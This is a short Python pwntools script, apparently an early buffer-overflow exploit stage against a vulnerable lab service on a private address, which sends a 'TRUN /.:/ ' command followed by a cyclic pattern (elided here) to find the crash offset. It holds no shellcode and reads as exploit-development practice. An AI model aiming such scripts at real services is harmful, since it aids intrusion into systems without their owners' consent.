#!/usr/bin/env python3
from pwn import *

RHOST = "192.168.0.109"
RPORT = 9999

# ./yz-patterns.py -p yz -l 4000
cyclic_pattern = b"..."

s = remote(RHOST,RPORT)

payload = b"".join([
  b"TRUN /.:/ ",
  cyclic_pattern
])

s.send(payload)
s.interactive()